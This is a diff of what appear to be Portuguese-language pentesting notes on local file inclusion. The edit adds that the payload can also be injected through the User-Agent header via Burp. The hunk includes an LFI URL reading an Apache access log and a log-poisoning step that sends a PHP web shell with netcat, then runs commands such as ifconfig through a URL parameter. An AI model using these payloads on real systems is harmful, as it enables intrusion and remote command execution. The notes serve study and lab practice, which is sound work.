@@ -3887,7 +3887,7 @@ LFI - Windows List [FOR MORE](https://gist.github.com/korrosivesec/a339e376bae22
 
     http://192.168.1.10/turismo/info.php?p=/../../../../var/log/apache2/access.log 
 
-Para acesso ao log injetar via `nc -v 192.168.1.10 80 -C` a shell `<?php system(\$_GET['kidman']);?>` via requisição e depois colocar no final da URL `/access.log&kidman=ifconfig`. Verificar se o host também dispõe de outras portas abertas, por exemplo a 25 para fazer a exploração SMTP e por aí vai.
+Para acesso ao log injetar via `nc -v 192.168.1.10 80 -C` a shell `<?php system(\$_GET['kidman']);?>` via requisição e depois colocar no final da URL `/access.log&kidman=ifconfig`. Podendo ser inserido também usando o `user-agent` com o burp. Verificar se o host também dispõe de outras portas abertas, por exemplo a 25 para fazer a exploração SMTP e por aí vai.
 
 1. Parte Email a Reverse Shell 
 
